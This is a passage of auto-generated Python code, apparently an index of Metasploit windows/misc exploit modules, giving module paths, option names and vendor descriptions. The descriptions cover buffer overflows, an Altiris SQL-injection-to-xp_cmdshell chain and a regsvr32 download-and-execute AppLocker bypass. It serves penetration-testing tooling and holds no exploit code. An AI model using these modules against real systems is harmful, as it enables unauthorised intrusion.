        by sending a specially crafted attach request.
      
		"""

		path = 'windows/misc/ib_isc_attach_database'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_fb_svc_attach(object):
		"""
		
        This module exploits a stack buffer overflow in Borland InterBase
        by sending a specially crafted service attach request.
      
		"""

		path = 'windows/misc/fb_svc_attach'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_borland_starteam(object):
		"""
		
          This module exploits a stack buffer overflow in Borland CaliberRM 2006. By sending
        a specially crafted GET request to the STMulticastService, an attacker may be
        able to execute arbitrary code.
      
		"""

		path = 'windows/misc/borland_starteam'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_misc_altiris_ds_sqli(object):
		"""
		
        This module exploits a SQL injection flaw in Symantec Altiris Deployment Solution 6.8
        to 6.9.164. The vulnerability exists on axengine.exe which fails to adequately sanitize
        numeric input fields in "UpdateComputer" notification Requests. In order to spawn a shell,
        several SQL injections are required in close succession, first to enable xp_cmdshell, then
        retrieve the payload via TFTP and finally execute it. The module also has the capability
        to disable or enable local application authentication. In order to work the target system
        must have a tftp client available.
      
		"""

		path = 'windows/misc/altiris_ds_sqli'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			required_XP_CMDSHELL = 'XP_CMDSHELL'
			required_DISABLE_SECURITY = 'DISABLE_SECURITY'
			required_ENABLE_SECURITY = 'ENABLE_SECURITY'

	class windows_misc_wireshark_packet_dect(object):
		"""
		
          This module exploits a stack buffer overflow in Wireshark <= 1.4.4
        by sending an malicious packet.
      
		"""

		path = 'windows/misc/wireshark_packet_dect'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			INTERFACE = 'INTERFACE'
			required_LOOP = 'LOOP'
			required_DELAY = 'DELAY'
			ExitOnSession = 'ExitOnSession'

	class windows_misc_regsvr32_applocker_bypass_server(object):
		"""
		
        This module simplifies the Regsvr32.exe Application Whitelisting Bypass technique.
        The module creates a web server that hosts an .sct file. When the user types the provided regsvr32
        command on a system, regsvr32 will request the .sct file and then execute the included PowerShell command.
        This command then downloads and executes the specified payload (similar to the web_delivery module with PSH).
        Both web requests (i.e., the .sct file and PowerShell download and execute) can occur on the same port.
      
		"""

		path = 'windows/misc/regsvr32_applocker_bypass_server'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'

	class windows_misc_hp_omniinet_4(object):
		"""
		
          This module exploits a vulnerability found in HP Data Protector's OmniInet
        process.  By supplying a long string of data as the file path with opcode '20',
        a buffer overflow can occur when this data is being written on the stack where
        no proper bounds checking is done beforehand, which results arbitrary code
        execution under the context of SYSTEM.  This module is also made against systems
        such as Windows Server 2003 or Windows Server 2008 that have DEP and/or ASLR
        enabled by default.
      
		"""

		path = 'windows/misc/hp_omniinet_4'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_bigant_server_250(object):
		"""
		
        This exploits a stack buffer overflow in the BigAnt Messaging Service,
        part of the BigAnt Server product suite. This module was tested
        successfully against version 2.50 SP1.
      
		"""

		path = 'windows/misc/bigant_server_250'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_citrix_streamprocess_data_msg(object):
		"""
		
        This module exploits a remote buffer overflow in the Citrix Provisioning Services
        5.6 SP1 (without Hotfix CPVS56SP1E043) by sending a malformed packet to the
        6905/UDP port.  The module has been successfully tested on Windows Server 2003 SP2,
        Windows 7, and Windows XP SP3.
      
		"""

		path = 'windows/misc/citrix_streamprocess_data_msg'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_misc_hp_loadrunner_magentproc(object):
		"""
		
        This module exploits a stack buffer overflow in HP LoadRunner before 11.52. The
        vulnerability exists on the LoadRunner Agent Process magentproc.exe. By sending
        a specially crafted packet, an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/misc/hp_loadrunner_magentproc'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_poppeeper_date(object):
		"""
		
          This module exploits a stack buffer overflow in POP Peeper v3.4.
        When a specially crafted DATE string is sent to a client,
        an attacker may be able to execute arbitrary code. This
        module is based off of krakowlabs code.
      
		"""

		path = 'windows/misc/poppeeper_date'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_hp_ovtrace(object):
		"""
		
          This module exploits a stack buffer overflow in HP OpenView Operations version A.07.50.
        By sending a specially crafted packet, a remote attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/misc/hp_ovtrace'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_ibm_websphere_java_deserialize(object):
		"""
		
        This module exploits a vulnerability in IBM's WebSphere Application Server. An unsafe deserialization
        call of unauthenticated Java objects exists to the Apache Commons Collections (ACC) library, which allows
        remote arbitrary code execution. Authentication is not required in order to exploit this vulnerability.
      
		"""

		path = 'windows/misc/ibm_websphere_java_deserialize'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			required_TARGETURI = 'TARGETURI'

	class windows_misc_allmediaserver_bof(object):
		"""
		
        This module exploits a stack buffer overflow in ALLMediaServer 0.8. The vulnerability
        is caused due to a boundary error within the handling of HTTP request.

        While the exploit supports DEP bypass via ROP, on Windows 7 the stack pivoting isn't
        reliable across virtual (VMWare, VirtualBox) and physical  environments. Because of
        this the module isn't using DEP bypass on the Windows 7 SP1 target, where by default
        DEP is OptIn and AllMediaServer won't run with DEP.
      
		"""

		path = 'windows/misc/allmediaserver_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_ib_isc_create_database(object):
		"""
		
        This module exploits a stack buffer overflow in Borland InterBase
        by sending a specially crafted create request.
      
		"""

		path = 'windows/misc/ib_isc_create_database'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_poisonivy_21x_bof(object):
		"""
		
        This module exploits a stack buffer overflow in the Poison Ivy 2.1.x C&C server.
        The exploit does not need to know the password chosen for the bot/server communication.
      
		"""

		path = 'windows/misc/poisonivy_21x_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_bigant_server_usv(object):
		"""
		
        This exploits a stack buffer overflow in the BigAnt Messaging Service,
        part of the BigAnt Server product suite. This module was tested
        successfully against version 2.52.

        NOTE: The AntServer service does not restart, you only get one shot.
      
		"""

		path = 'windows/misc/bigant_server_usv'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_bigant_server_dupf_upload(object):
		"""
		
          This exploits an arbitrary file upload vulnerability in BigAnt Server 2.97 SP7.
        A lack of authentication allows to make unauthenticated file uploads through a DUPF
        command. Additionally the filename option in the same command can be used to launch
        a directory traversal attack and achieve arbitrary file upload.

        The module uses uses the Windows Management Instrumentation service to execute an
        arbitrary payload on vulnerable installations of BigAnt on Windows XP and 2003. It
        has been successfully tested on BigAnt Server 2.97 SP7 over Windows XP SP3 and 2003
        SP2.
      
		"""

		path = 'windows/misc/bigant_server_dupf_upload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			required_DEPTH = 'DEPTH'

	class windows_misc_tiny_identd_overflow(object):
		"""
		
          This module exploits a stack based buffer overflow in TinyIdentD version 2.2.
        If we send a long string to the ident service we can overwrite the return
        address and execute arbitrary code. Credit to Maarten Boone.
      
		"""

		path = 'windows/misc/tiny_identd_overflow'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_poppeeper_uidl(object):
		"""
		
          This module exploits a stack buffer overflow in POP Peeper v3.4.
        When a specially crafted UIDL string is sent to a client,
        an attacker may be able to execute arbitrary code. This
        module is based off of krakowlabs code.
      
		"""

		path = 'windows/misc/poppeeper_uidl'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_misc_vmhgfs_webdav_dll_sideload(object):
		"""
		
      A DLL side loading vulnerability was found in the VMware Host Guest Client Redirector,
      a component of VMware Tools. This issue can be exploited by luring a victim into
      opening a document from the attacker's share. An attacker can exploit this issue to
      execute arbitrary code with the privileges of the target user. This can potentially
      result in the attacker taking complete control of the affected system. If the WebDAV
      Mini-Redirector is enabled, it is possible to exploit this issue over the internet.
      
		"""

		path = 'windows/misc/vmhgfs_webdav_dll_sideload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_BASENAME = 'BASENAME'
			required_SHARENAME = 'SHARENAME'

	class windows_misc_mini_stream(object):
		"""
		
          This module exploits a stack buffer overflow in Mini-Stream 3.0.1.1
        By creating a specially crafted pls file, an an attacker may be able
        to execute arbitrary code.
      
		"""

		path = 'windows/misc/mini_stream'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_misc_hp_operations_agent_coda_34(object):
		"""
		
          This module exploits a buffer overflow vulnerability in HP Operations Agent for
        Windows. The vulnerability exists in the HP Software Performance Core Program
        component (coda.exe) when parsing requests for the 0x34 opcode. This module has
        been tested successfully on HP Operations Agent 11.00 over Windows XP SP3 and
        Windows 2003 SP2 (DEP bypass).

        The coda.exe components runs only for localhost by default, network access must be
        granted through its configuration to be remotely exploitable. On the other hand it
        runs on a random TCP port, to make easier reconnaissance a check function is
        provided.
      
		"""

		path = 'windows/misc/hp_operations_agent_coda_34'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
